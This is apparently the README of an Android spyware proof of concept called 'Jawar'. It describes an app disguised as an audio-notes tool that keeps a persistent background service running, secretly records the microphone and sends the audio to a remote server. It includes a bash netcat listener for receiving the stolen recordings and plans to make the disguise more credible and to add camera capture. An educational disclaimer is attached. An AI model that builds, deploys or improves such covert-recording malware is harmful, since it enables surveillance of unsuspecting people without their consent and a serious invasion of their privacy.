# Jawar

Jawar is a malware for Android.

# Disclaimer

This software is a proof of concept and should never be used in a real environnement, I take no responsibilities for the misuse you can give it. I will say it again, this software is for educational purposes only. No responsibility is held or accepted for misuse.

# How does it work?

The attacker would show you the app as a tool for recording audio notes, so during installation any user will give it permission to access microphone. Once installed, the app will print a message like "Downloading plugins (this could take a while), please come back later :)" (We could program a real functionality for the *legitim* app, but this is a Proof of Concept so we will stay with the message). At this point, the user closed the app and forgot about it for some (hours? days?).

# What does it do ?

Jawar **always** keeps a service running in background and constantly records user's life using his microphone (remember that user granted permission for it).
After recording, Jawar sends the audio file to a remote server using TCP sockets. 

# Server (audio receiver)

You can program something easy in any lenguage, here is an example in bash (you will need netcat):
``` bash
#!/bin/bash

i=1
while [ True ]; do
	nc -l -p 4444 > ~/Desktop/audio$i.3gp
	i=$((i+1))
done
```

# More info

- Works for Android 5.0 and above
- The malicious background service only starts if the phone has any kind of connection to the network/Internet.
- This service runs periodically (the period is changeable)
- It records samples of 30 seconds (changeable)
- It is persistent, Jawar's malicious service keeps executing even if the app is closed or the phone is rebooted (Thanks to [scheduled services](https://developer.android.com/guide/components/services.html) of Android).  

# To Do

- Check what happens if Jawar is recording and user opens an app that needs the microphone (or starts a phone call).
- Give it a real *legitim* functionnality, so the app will be more credible.
- This PoC was made exclusively for the microphone... What about the camera ?
- ~~Upload it to the PlayStore.~~ Don't do it. Don't try it. Just don't.
